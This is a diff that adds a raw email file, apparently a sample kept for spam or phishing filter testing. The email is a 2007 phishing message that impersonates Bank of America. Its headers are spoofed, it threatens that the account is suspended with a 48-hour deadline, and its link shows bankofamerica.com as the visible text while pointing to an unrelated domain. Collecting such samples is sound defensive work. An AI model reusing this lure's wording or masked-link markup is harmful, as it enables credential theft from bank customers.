@@ -1,0 +1,68 @@
+From nobody Sun Jan 25 13:50:01 2015
+Return-Path: <service@bankofamerica.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 2573A468F8
+ for <user@login.example.com>; Fri, 12 Jan 2007 08:39:21 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 1D070131FAAB
+ for <user@example.com>; Fri, 12 Jan 2007 08:39:20 -0500 (EST)
+Received: from mail.usequitymortgage.com (mail.usequitymortgage.com
+ [72.1.78.12]) by mail.example.org (Postfix) with ESMTP id 17B3C6FA1A8
+ for <user@example.com>; Fri, 12 Jan 2007 08:39:20 -0500 (EST)
+Received: from User ([74.238.16.147]) by mail.usequitymortgage.com with
+ Microsoft SMTPSVC(5.0.2195.6713); Fri, 12 Jan 2007 08:42:19 -0500
+Reply-To: <no.reply@bankofamerica.com>
+From: "Bank of America"<service@bankofamerica.com>
+Subject: Online Banking Notification: An update for your online profile
+ (Important)
+Date: Fri, 12 Jan 2007 08:41:11 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <USESVRZd0488AqAYrGM00000f36@mail.usequitymortgage.com>
+X-OriginalArrivalTime: 12 Jan 2007 13:42:19.0484 (UTC)
+ FILETIME=[7ADB09C0:01C7364F]
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 610
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bank of AmericaManhattan Bank</title>
+</head>
+
+<body>
+
+<div style="width: 600px; margin: 0 auto 0 auto; border: 1px dashed black; padding: 20px 15px 1px 15px; font-size: 12px">
+<img src="http://www.bankofamerica.com/global/mvc_objects/images/mhd_reg_logo.gif" width="250" height="69" />
+<p style="font-weight: bold; color: #072510; font-family: arial;" >Dear Customer,</p>
+<p style="font-weight: bold; color: #072510; font-family: arial;" align="justify">As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you. In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile.</p>
+<p style="font-weight: bold; color: #072510; font-family: arial;" align="justify">Currently we are trying to upgrade our on-line security measures. All accounts have been temporarly suspended untill each person completes our secure online form. For this operation you will be required to pass trough a series of authentifications.</p>
+<p style="font-weight: bold; color: #710; font-family: arial;" align="justify">We won't require your ATM PIN number for this operation</p>
+<p style="font-weight: bold; color: #072510; font-family: arial;" align="justify">To begin unlocking your Bank of America account please click the link below.</p>
+
+<p style="font-weight: bold; color: #074580; font-family: arial;" align="center">
+<a style="color: #074580" href="http://www.worlands.com/gallery/include/www.bankofamerica.com/update-information/online/ 
+">http://www.bankofamerica.com/index.cfm</a></p>
+<div style="background-color:#f2f2e1; padding: 0 5px 2px 0; margin:0; border: 1px solid red;"><p style="font-weight: bold; color: #074580; font-family: arial; padding: 0; margin: 0;">Please note:</p>
+<p style="font-weight: bold; color: #074580; font-family: arial; padding: 0; margin: 0;" align="justify">(Bank of America Bank will never ask for your ATM/PIN) If we don't receive your account verification within 48 hours from you, we will further lock down your account untill we will be able to contact you by e-mail or phone. </p>
+</div>
+<div align="center" style="margin-top: 20px;MARGIN-BOTTOM: 10px; COLOR: #666666; font-family: arial; text-align: center; background-image: url('http://www.chase.com/ccpmweb/generic/image/footer_gradient.gif'); height: 30px">Bank of America, N.A. Member FDIC. Equal Housing Lender.
+</div>
+
+
+		
+</div>
+</body>
+</html>
